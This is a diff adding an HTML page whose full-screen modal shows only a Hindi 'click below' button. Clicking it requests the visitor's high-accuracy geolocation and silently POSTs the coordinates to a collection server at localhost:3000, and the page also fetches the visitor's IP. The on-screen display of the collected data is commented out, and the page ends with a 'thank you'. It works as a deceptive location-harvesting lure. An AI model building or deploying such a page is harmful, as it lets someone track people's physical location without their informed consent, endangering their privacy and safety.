@@ -1,0 +1,169 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>लोकेशन शेयर Modal</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      overflow: hidden;
+    }
+    .modal {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      z-index: 9999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      animation: fadeIn 0.4s ease-in-out;
+    }
+    .modal-content {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0px 4px 12px rgba(0,0,0,0.3);
+      animation: slideUp 0.4s ease-in-out;
+    }
+    .modal-content p {
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      border: none;
+      background: linear-gradient(45deg, #007bff, #00d4ff);
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      justify-content: center;
+    }
+    button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(45deg, #0062cc, #00a8cc);
+    }
+    pre {
+      display: none;
+      max-width: 600px;
+      margin: 20px auto;
+      background: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0px 2px 8px rgba(0,0,0,0.1);
+    }
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity: 1;}
+    }
+    @keyframes slideUp {
+      from {transform: translateY(50px); opacity: 0;}
+      to {transform: translateY(0); opacity: 1;}
+    }
+    /* SVG arrow animation */
+    .arrow-animate {
+      animation: bounce 1s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(4px); }
+    }
+  </style>
+</head>
+<body>
+  <pre id="out"></pre>
+
+  <!-- Modal -->
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <p id="modalText">नीचे क्लिक करें</p>
+      <button id="clickBtn">
+        <!-- Animated SVG arrow -->
+        <svg class="arrow-animate" width="24" height="24" viewBox="0 0 24 24" fill="none">
+          <path d="M12 5v14M5 12l7 7 7-7" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        क्लिक करें
+      </button>
+    </div>
+  </div>
+
+  <script>
+    async function show(msg) {
+      const out = document.getElementById('out');
+      out.textContent = msg;
+      out.style.display = 'block';
+    }
+
+    async function getIpFromServer() {
+      try {
+        const r = await fetch('http://localhost:3000/whoami');
+        if (!r.ok) return null;
+        const j = await r.json();
+        return j.ip;
+      } catch (e) {
+        return null;
+      }
+    }
+
+    async function requestLocation() {
+      if (!('geolocation' in navigator)) {
+        await show('आपका ब्राउज़र लोकेशन सपोर्ट नहीं करता।');
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const latitude = pos.coords.latitude;
+        const longitude = pos.coords.longitude;
+        const accuracy = pos.coords.accuracy;
+
+        const ip = await getIpFromServer();
+
+        const payload = { latitude, longitude, accuracy };
+
+        const res = await fetch('http://localhost:3000/report', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await res.json();
+
+        // await show(JSON.stringify({
+        //   clientIp: ip,
+        //   latitude, longitude, accuracy,
+        //   serverResponse: data
+        // }, null, 2));
+
+        document.getElementById('modalText').textContent = "धन्यवाद!";
+        document.getElementById('clickBtn').style.display = "none";
+
+        setTimeout(() => {
+          document.getElementById('myModal').style.display = 'none';
+          document.body.style.overflow = 'auto';
+        }, 1500);
+
+      }, (err) => {
+        show('अनुमति अस्वीकृत या त्रुटि: ' + err.message);
+        document.getElementById('modalText').textContent = "अनुमति अस्वीकृत";
+        document.getElementById('clickBtn').style.display = "none";
+        setTimeout(() => {
+          document.getElementById('myModal').style.display = 'none';
+          document.body.style.overflow = 'auto';
+        }, 1500);
+      }, { enableHighAccuracy: true, timeout: 10000 });
+    }
+
+    document.getElementById('clickBtn').addEventListener('click', requestLocation);
+  </script>
+</body>
+</html>
